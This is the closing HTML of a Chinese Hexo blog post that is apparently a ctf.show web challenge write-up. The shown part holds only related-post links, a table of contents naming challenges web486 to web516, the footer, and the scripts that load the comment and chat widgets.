is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">CMS</div></div></a></div><div><a href="/ctf.show/JWT/" title="JWT"><img class="cover" src="https://cdn.pixabay.com/photo/2016/10/22/17/46/mountains-1761292_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">JWT</div></div></a></div><div><a href="/ctf.show/SSRF/" title="SSRF"><img class="cover" src="https://cdn.pixabay.com/photo/2016/10/18/21/28/seljalandsfoss-1751463_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">SSRF</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web486"><span class="toc-number">1.</span> <span class="toc-text">web486</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web487"><span class="toc-number">2.</span> <span class="toc-text">web487</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web488"><span class="toc-number">3.</span> <span class="toc-text">web488</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web489"><span class="toc-number">4.</span> <span class="toc-text">web489</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web490"><span class="toc-number">5.</span> <span class="toc-text">web490</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web491"><span class="toc-number">6.</span> <span class="toc-text">web491</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web492"><span class="toc-number">7.</span> <span class="toc-text">web492</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web493"><span class="toc-number">8.</span> <span class="toc-text">web493</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web494-495"><span class="toc-number">9.</span> <span class="toc-text">web494-495</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web496"><span class="toc-number">10.</span> <span class="toc-text">web496</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web497"><span class="toc-number">11.</span> <span class="toc-text">web497</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web498"><span class="toc-number">12.</span> <span class="toc-text">web498</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web499"><span class="toc-number">13.</span> <span class="toc-text">web499</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web500"><span class="toc-number">14.</span> <span class="toc-text">web500</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web501"><span class="toc-number">15.</span> <span class="toc-text">web501</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web502"><span class="toc-number">16.</span> <span class="toc-text">web502</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web503"><span class="toc-number">17.</span> <span class="toc-text">web503</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web504"><span class="toc-number">18.</span> <span class="toc-text">web504</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web505"><span class="toc-number">19.</span> <span class="toc-text">web505</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web506"><span class="toc-number">20.</span> <span class="toc-text">web506</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web507"><span class="toc-number">21.</span> <span class="toc-text">web507</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web508"><span class="toc-number">22.</span> <span class="toc-text">web508</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web509"><span class="toc-number">23.</span> <span class="toc-text">web509</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web510"><span class="toc-number">24.</span> <span class="toc-text">web510</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web511"><span class="toc-number">25.</span> <span class="toc-text">web511</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web512"><span class="toc-number">26.</span> <span class="toc-text">web512</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web513"><span class="toc-number">27.</span> <span class="toc-text">web513</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web514"><span class="toc-number">28.</span> <span class="toc-text">web514</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web515"><span class="toc-number">29.</span> <span class="toc-text">web515</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web516"><span class="toc-number">30.</span> <span class="toc-text">web516</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
      avatar: 'monsterid',
      serverURLs: 'https://valine.wanan.red',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://www.wanan.red/ctf.show/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/'
    this.page.identifier = '/ctf.show/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/'
    this.page.title = '中期测评'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://www-wanan-red.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script>(function(d, w, c) {
    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
    var s = d.createElement('script');
    w[c] = w[c] || function() {
        (w[c].q = w[c].q || []).push(arguments);
    };
    s.async = true;
    s.src = 'https://call.chatra.io/chatra.js';
    if (d.head) d.head.appendChild(s);
})(document, window, 'Chatra');

if (true) {
  var chatBtnFn = () => {
    var chatBtn = document.getElementById("chat_btn")
    chatBtn.addEventListener("click", function(){
      Chatra('openChat')
    });
  }
  chatBtnFn()
} else {
  if (false) {
    function chatBtnHide () {
      Chatra('hide')
    }
    function chatBtnShow () {
      Chatra('show')
    }
  }
}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>